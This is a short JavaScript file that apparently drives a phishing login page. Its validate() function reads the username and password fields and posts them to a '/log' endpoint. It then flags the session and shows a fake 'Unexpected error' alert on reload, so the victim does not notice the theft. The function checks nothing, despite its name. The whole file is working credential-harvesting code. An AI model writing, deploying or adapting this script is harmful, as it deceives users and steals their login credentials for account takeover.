if(sessionStorage.getItem("logged") == "true"){
	alert("Unexpected error occur. please try again later.")
	window.location = window.location
}

function validate(){
	var xhttp = new XMLHttpRequest();
	var user = document.getElementById("user").value
	var pass = document.getElementById("pass").value
	
	xhttp.onreadystatechange = function() {
		if (this.readyState == 4) {
			console.log(this.responseText)
			sessionStorage.setItem("logged","true")
			window.location = window.location
		}
	};
	xhttp.open("POST", window.location.origin + "/log" );
	
	console.log("Starting File Upload")
	xhttp.onprogress = function (e) {
		if (e.lengthComputable) {
			console.log(e.loaded+  " / " + e.total)
		}
	}
	xhttp.onloadstart = function (e) {
		console.log("start")
	}
	xhttp.onloadend = function (e) {
		console.log("end")
	}
	
	xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	xhttp.setRequestHeader("Upgrade-Insecure-Requests", "1");
	xhttp.send("user="+user+"&pass="+pass);
	
	
	xhttp.onprogress = function (e) {
    if (e.lengthComputable) {
        console.log(e.loaded+  " / " + e.total)
    }
}
}

